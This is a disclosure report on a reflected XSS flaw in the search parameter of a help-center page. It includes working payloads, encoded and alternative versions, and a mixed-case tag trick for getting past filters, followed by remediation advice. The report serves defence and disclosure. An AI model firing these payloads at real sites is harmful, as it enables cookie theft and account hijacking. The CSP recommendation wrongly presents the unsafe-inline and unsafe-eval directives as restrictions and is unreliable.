# Reflected XSS in Help Center Search Results

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `search` parameter of the application's Help Center search functionality.

The application accepts user-controlled input through the `search` GET parameter and reflects it back to the page without proper sanitization or output encoding. By injecting a `<ScriPt>` tag with mixed-case formatting and using `</script>` to break out of existing script contexts, arbitrary code execution is achieved when the victim visits the crafted URL.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameter

```text
search
```

## Vulnerable URL

```text
https://kzlabs.in/55.php?search='>anil<ScriPt>alert(1)</SCriPt>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the value of the `search` parameter with the following payload:

   ```text
   '>anil<ScriPt>alert(1)</SCriPt>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/55.php?search=%27%3Eanil%3CScriPt%3Ealert%281%29%3C%2FSCriPt%3E
   ```

4. Observe that the browser executes the injected payload and displays an `alert(1)` popup.

## Payloads Used

```text
'>anil<ScriPt>alert(1)</SCriPt>
```

URL-encoded version:
```text
%27%3Eanil%3CScriPt%3Ealert%281%29%3C%2FSCriPt%3E
```

Alternative payload:
```text
%27">anil%3C%2Fscript%3E%3CScriPt%3Ealert%281%29%3C%2FScriPt%3E
```

## Proof of Concept

The application accepts the value of the `search` parameter and reflects it directly into the page HTML without proper sanitization.

The payload works by:
1. Breaking out of the existing HTML context using `'>`
2. Injecting a `<ScriPt>` tag with mixed-case formatting to evade case-sensitive filters
3. The browser parses and executes the injected script tag regardless of case
4. The `alert(1)` function executes, displaying a popup

```html
<!-- Injected payload rendered in the page: -->
'><script>alert(1)</script>
```

The payload is also reflected in the search results heading, confirming the vulnerability.

<img width="1504" height="626" alt="Screenshot 2026-08-14 202835" src="https://github.com/user-attachments/assets/2ebee124-c514-4766-8ff4-f37ed5f3f5af" />
<img width="1319" height="562" alt="Screenshot 2026-08-14 202828" src="https://github.com/user-attachments/assets/7e587e97-2728-433a-99f1-afef824814a1" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass case-sensitive filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
  ```

- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.

- **Case-Insensitive Filtering**: If implementing input filtering, ensure it is case-insensitive by converting all input to lowercase or using case-insensitive pattern matching.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and unauthorized script sources using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes regardless of case.

- **Avoid Direct Reflection**: Consider avoiding the direct reflection of user input in the response. Use server-side validation and sanitization before output.

---
